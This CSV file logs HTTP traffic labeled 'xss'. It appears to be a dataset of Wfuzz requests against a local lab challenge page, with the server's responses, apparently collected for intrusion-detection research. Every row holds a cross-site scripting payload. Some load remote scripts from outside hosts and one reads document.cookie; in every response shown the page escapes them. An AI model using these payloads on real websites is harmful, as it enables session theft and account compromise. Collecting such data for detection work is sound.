attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
xss,192.168.1.39,80,"name=<noscript oncut=""alert(1)"" contenteditable>test</noscript>&submit=send",*/*,75,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;noscript oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/noscript&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,438,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:26 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49428
xss,192.168.1.39,80,"name=<ol onpaste=""alert(1)"" contenteditable>test</ol>&submit=send",*/*,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;ol onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/ol&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,428,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:26 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49429
xss,192.168.1.39,80,"name=<output oncut=""alert(1)"" contenteditable>test</output>&submit=send",*/*,71,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;output oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/output&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,434,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49430
xss,192.168.1.39,80,name=<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>&submit=send,*/*,101,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;plaintext id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/plaintext&gt;&lt;input autofocus&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,460,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49431
xss,192.168.1.39,80,"name=<pre onkeydown=""alert(1)"" contenteditable>test</pre>&submit=send",*/*,69,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;pre onkeydown=&quot;alert(1)&quot; contenteditable&gt;test&lt;/pre&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,432,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49432
xss,192.168.1.39,80,"name=<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>&submit=send",*/*,70,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;rp draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/rp&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,443,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49433
xss,192.168.1.39,80,"name=<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>&submit=send",*/*,70,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;rt draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/rt&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,443,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49434
xss,192.168.1.39,80,"name=<section draggable=""true"" ondrag=""alert(1)"">test</section>&submit=send",*/*,75,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;section draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/section&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,448,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49435
xss,192.168.1.39,80,"name=<small draggable=""true"" ondragend=""alert(1)"">test</small>&submit=send",*/*,74,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;small draggable=&quot;true&quot; ondragend=&quot;alert(1)&quot;&gt;test&lt;/small&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,447,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49436
xss,192.168.1.39,80,"name=<small onmouseout=""alert(1)"">test</small>&submit=send",*/*,58,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;small onmouseout=&quot;alert(1)&quot;&gt;test&lt;/small&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,421,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49437
xss,192.168.1.39,80,"name=<strike draggable=""true"" ondrag=""alert(1)"">test</strike>&submit=send",*/*,73,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;strike draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/strike&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,446,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49438
xss,192.168.1.39,80,"name=<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>&submit=send",*/*,126,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;kbd id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/kbd&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,501,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49439
xss,192.168.1.39,80,"name=<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>&submit=send",*/*,123,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;head id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/head&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,498,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49440
xss,192.168.1.39,80,"name=<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>&submit=send",*/*,121,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;map id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/map&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,496,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49441
xss,192.168.1.39,80,"name=<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></acronym>&submit=send",*/*,149,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;acronym id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/acronym&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,524,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49442
xss,192.168.1.39,80,"name=<style>@keyframes slidein {}</style><body style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></body>&submit=send",*/*,179,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;body style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/body&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,564,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49443
xss,192.168.1.39,80,"name=<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></div>&submit=send",*/*,193,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;div id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/div&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,578,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49444
xss,192.168.1.39,80,"name=<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>&submit=send",*/*,110,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;bdi style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/bdi&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,495,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49445
xss,192.168.1.39,80,"name=<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>&submit=send",*/*,114,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;frame style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/frame&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,499,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49446
xss,192.168.1.39,80,"name=<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>&submit=send",*/*,114,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;embed style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/embed&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,499,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49447
xss,192.168.1.39,80,"name=<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>&submit=send",*/*,114,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;hgroup style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;&gt;&lt;/hgroup&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,499,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:29 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49448
xss,192.168.1.39,80,"name=<svg oncontextmenu=""alert(1)"">test</svg>&submit=send",*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;svg oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/svg&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49449
xss,192.168.1.39,80,name=<svg><del onload=alert(1)></del>&submit=send,*/*,49,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;svg&gt;&lt;del onload=alert(1)&gt;&lt;/del&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,408,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49450
xss,192.168.1.39,80,name=<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>&submit=send,*/*,92,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;table id=x tabindex=1 ondeactivate=alert(1)&gt;&lt;/table&gt;&lt;input id=y autofocus&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,451,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49451
xss,192.168.1.39,80,"name=<template onbeforecopy=""alert(1)"" contenteditable>test</template>&submit=send",*/*,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;template onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/template&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,445,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49452
xss,192.168.1.39,80,name=<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>&submit=send,*/*,74,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;thead id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/thead&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,427,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49453
xss,192.168.1.39,80,"name=<track onkeydown=""alert(1)"" contenteditable>test</track>&submit=send",*/*,73,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;track onkeydown=&quot;alert(1)&quot; contenteditable&gt;test&lt;/track&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,436,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:30 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49454
xss,192.168.1.39,80,name=<ul id=x tabindex=1 onfocusin=alert(1)></ul>&submit=send,*/*,61,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;ul id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/ul&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,414,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49455
xss,192.168.1.39,80,"name=<wbr oncut=""alert(1)"" contenteditable>test</wbr>&submit=send",*/*,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;wbr oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/wbr&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,428,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49457
xss,192.168.1.39,80,"name=<video onmouseup=""alert(1)"">test</video>&submit=send",*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;video onmouseup=&quot;alert(1)&quot;&gt;test&lt;/video&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49456
xss,192.168.1.39,80,name=<<scr\0ipt/src=http://xss.com/xss.js></script&submit=send,*/*,62,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;&lt;scr\0ipt/src=http://xss.com/xss.js&gt;&lt;/script <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,415,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49458
xss,192.168.1.39,80,"name=<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>&submit=send",*/*,68,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,431,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49459
xss,192.168.1.39,80,"name=<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>&submit=send",*/*,72,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div id=d&gt;&lt;x xmlns=&#039;&quot;&gt;&lt;iframe onload=alert(2)//&#039;&gt;&lt;/div&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,452,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49460
xss,192.168.1.39,80,"name=<div id=""137""><svg>&submit=send",*/*,36,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div id=&quot;137&quot;&gt;&lt;svg&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,399,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49461
xss,192.168.1.39,80,"name=<div id=""131""><b>drag and drop one of the following strings to the drop box:</b>&submit=send",*/*,97,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div id=&quot;131&quot;&gt;&lt;b&gt;drag and drop one of the following strings to the drop box:&lt;/b&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,466,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49462
xss,192.168.1.39,80,name=feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>&submit=send,*/*,131,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: feed:javascript:alert(&#039;Top Page Location: &#039; document.location &#039; Host Page Cookies: &#039; document.cookie);//&lt;br/&gt;&lt;hr/&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",,504,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49463
